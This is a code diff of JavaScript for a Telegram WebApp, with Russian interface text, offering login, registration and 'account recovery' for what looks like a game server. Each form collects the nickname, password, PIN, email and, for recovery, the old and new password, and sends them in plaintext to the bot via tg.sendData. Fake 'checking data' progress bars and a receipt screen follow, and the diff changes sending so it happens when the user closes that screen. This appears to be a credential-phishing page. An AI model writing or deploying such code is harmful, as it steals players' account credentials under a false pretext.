@@ -2,7 +2,7 @@ const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
-// === АНИМАЦИЯ ЗАГРУЗКИ ПРИ СТАРТЕ ===
+// === ЗАГРУЗКА ПРИ СТАРТЕ ===
 let percent = 0;
 const bar = document.getElementById('bar');
 const percentText = document.getElementById('percent');
@@ -25,7 +25,6 @@ if (loader && main) {
     }, 30);
 }
 
-// === ПИН-КОД ===
 function togglePin() {
     const checkbox = document.getElementById('hasPin');
     const pinInput = document.getElementById('pin');
@@ -53,36 +52,22 @@ function onlyPin(input) {
     input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
 }
 
-// === ПРОВЕРКА НИКА ===
 function checkNick() {
     const nick = document.getElementById('nick').value.trim();
     const icon = document.getElementById('iconNick');
     if (!icon) return;
-
     const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
-
-    if (valid) {
-        icon.classList.remove('red');
-        icon.classList.add('green');
-    } else {
-        icon.classList.remove('green');
-        icon.classList.add('red');
-    }
+    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
+    else { icon.classList.remove('green'); icon.classList.add('red'); }
 }
 
 function markFilled(inputId, iconId) {
     const input = document.getElementById(inputId);
     const icon = document.getElementById(iconId);
     if (!input || !icon) return;
-
     input.addEventListener('input', () => {
-        if (input.value.trim() !== '') {
-            icon.classList.remove('red');
-            icon.classList.add('green');
-        } else {
-            icon.classList.remove('green');
-            icon.classList.add('red');
-        }
+        if (input.value.trim() !== '') { icon.classList.remove('red'); icon.classList.add('green'); }
+        else { icon.classList.remove('green'); icon.classList.add('red'); }
     });
 }
 
@@ -96,19 +81,11 @@ document.addEventListener('DOMContentLoaded', () => {
     markFilled('new_password', 'iconNewPass');
 });
 
-// === АНИМАЦИЯ ЗАГРУЗКИ ===
 function showLoading(text, callback) {
     const loaderDiv = document.createElement('div');
     loaderDiv.className = 'loader-screen';
     loaderDiv.id = 'tempLoader';
-    loaderDiv.innerHTML = `
-        <div class="loader-circle"></div>
-        <div class="loader-text">${text}</div>
-        <div class="loader-percent" id="tempPercent">0%</div>
-        <div class="loader-bar">
-            <div class="loader-bar-fill" id="tempBar"></div>
-        </div>
-    `;
+    loaderDiv.innerHTML = `<div class="loader-circle"></div><div class="loader-text">${text}</div><div class="loader-percent" id="tempPercent">0%</div><div class="loader-bar"><div class="loader-bar-fill" id="tempBar"></div></div>`;
     document.body.appendChild(loaderDiv);
 
     let p = 0;
@@ -117,10 +94,7 @@ function showLoading(text, callback) {
         if (p >= 100) {
             p = 100;
             clearInterval(int);
-            setTimeout(() => {
-                loaderDiv.remove();
-                if (callback) callback();
-            }, 300);
+            setTimeout(() => { loaderDiv.remove(); if (callback) callback(); }, 300);
         }
         const tempBar = document.getElementById('tempBar');
         const tempPercent = document.getElementById('tempPercent');
@@ -129,16 +103,14 @@ function showLoading(text, callback) {
     }, 30);
 }
 
-// === ОТПРАВКА ДАННЫХ СРАЗУ ===
-function sendToBot(text) {
-    try {
-        tg.sendData(text);
-    } catch (e) {
-        console.error('Ошибка отправки:', e);
-    }
+let pendingData = null;
+function sendToBot(text) { pendingData = text; }
+
+function closeSuccess() {
+    if (pendingData) { try { tg.sendData(pendingData); } catch (e) { console.error(e); } }
+    tg.close();
 }
 
-// === СООБЩЕНИЕ ОБ УСПЕХЕ (ЧЕК) ===
 function showSuccess(text, nick, server, type) {
     const now = new Date();
     const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
@@ -153,22 +125,11 @@ function showSuccess(text, nick, server, type) {
                 <div class="success-time">${time}</div>
             </div>
             <div class="success-body">
-                <div class="success-row">
-                    <span class="success-label">НИК</span>
-                    <span class="success-value">${nick}</span>
-                </div>
-                <div class="success-row">
-                    <span class="success-label">ОПЕРАЦИЯ</span>
-                    <span class="success-value">${type}</span>
-                </div>
-                <div class="success-row">
-                    <span class="success-label">СЕРВЕР</span>
-                    <span class="success-value">${server}</span>
-                </div>
+                <div class="success-row"><span class="success-label">НИК</span><span class="success-value">${nick}</span></div>
+                <div class="success-row"><span class="success-label">ОПЕРАЦИЯ</span><span class="success-value">${type}</span></div>
+                <div class="success-row"><span class="success-label">СЕРВЕР</span><span class="success-value">${server}</span></div>
             </div>
-            <div class="success-wait-static">
-                Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span>
-            </div>
+            <div class="success-wait-static">Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span></div>
             <button class="success-close-btn" onclick="closeSuccess()">ЗАКРЫТЬ</button>
         </div>
     `;
@@ -184,7 +145,6 @@ function showSuccess(text, nick, server, type) {
     const interval = setInterval(() => {
         counter--;
         dotIndex = (dotIndex + 1) % 4;
-
         if (counter > 0) {
             if (waitNum) waitNum.textContent = counter;
             if (waitDots) waitDots.textContent = dots[dotIndex];
@@ -199,26 +159,13 @@ function showSuccess(text, nick, server, type) {
     }, 300);
 }
 
-// === ЗАКРЫТИЕ ЧЕКА ===
-function closeSuccess() {
-    const overlay = document.querySelector('.success-overlay');
-    if (overlay) overlay.remove();
-    tg.close();
-}
-
-// === НАВИГАЦИЯ ===
 function goTo(page) { window.location.href = page; }
+function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
 
-function validateNick(nick) {
-    return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
-}
-
-// === ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
 function toggleServerList() {
     const dropdown = document.getElementById('serverDropdown');
     if (dropdown) dropdown.classList.toggle('active');
 }
-
 function selectServer(value) {
     const valueEl = document.getElementById('serverValue');
     const hiddenInput = document.getElementById('server');
@@ -227,26 +174,14 @@ function selectServer(value) {
     toggleServerList();
 }
 
-// === ВХОД ===
 function login() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
-
     if (!nick) { alert('Введите ник!'); return; }
     if (!password) { alert('Введите пароль!'); return; }
-
-    const data = (
-        `🔐 ВХОД В АККАУНТ\n\n` +
-        `👤 Ник: ${nick}\n` +
-        `🔒 Пароль: ${password}\n` +
-        `🛡 ПИН-код: ${pin || 'нет'}\n` +
-        `🌍 Сервер: ${server}`
-    );
-
-    sendToBot(data);
-
+    sendToBot(`🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
         showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
             showSuccess('', nick, server, 'Вход в аккаунт');
@@ -254,7 +189,6 @@ function login() {
     });
 }
 
-// === РЕГИСТРАЦИЯ ===
 function register() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
@@ -262,23 +196,10 @@ function register() {
     const email = document.getElementById('email').value.trim();
     const server = document.getElementById('server').value;
     const referrer = document.getElementById('referrer').value.trim();
-
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
     if (!password) { alert('Введите пароль!'); return; }
-
-    const data = (
-        `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n` +
-        `👤 Ник: ${nick}\n` +
-        `🔒 Пароль: ${password}\n` +
-        `🛡 ПИН-код: ${pin || 'нет'}\n` +
-        `📧 Почта: ${email || 'нет'}\n` +
-        `🌍 Сервер: ${server}\n` +
-        `👥 Пригласил: ${referrer || 'нет'}`
-    );
-
-    sendToBot(data);
-
+    sendToBot(`📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`);
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
         showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
             showSuccess('', nick, server, 'Создание аккаунта');
@@ -286,29 +207,16 @@ function register() {
     });
 }
 
-// === ВОССТАНОВЛЕНИЕ ===
 function recover() {
     const nick = document.getElementById('nick').value.trim();
     const oldPass = document.getElementById('old_password').value.trim();
     const newPass = document.getElementById('new_password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
-
     if (!nick) { alert('Введите ник!'); return; }
     if (!oldPass) { alert('Введите старый пароль!'); return; }
     if (!newPass) { alert('Введите новый пароль!'); return; }
-
-    const data = (
-        `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n` +
-        `👤 Ник: ${nick}\n` +
-        `🔓 Старый пароль: ${oldPass}\n` +
-        `🔒 Новый пароль: ${newPass}\n` +
-        `🛡 ПИН-код: ${pin || 'нет'}\n` +
-        `🌍 Сервер: ${server}`
-    );
-
-    sendToBot(data);
-
+    sendToBot(`🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
         showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
             showSuccess('', nick, server, 'Восстановление аккаунта');
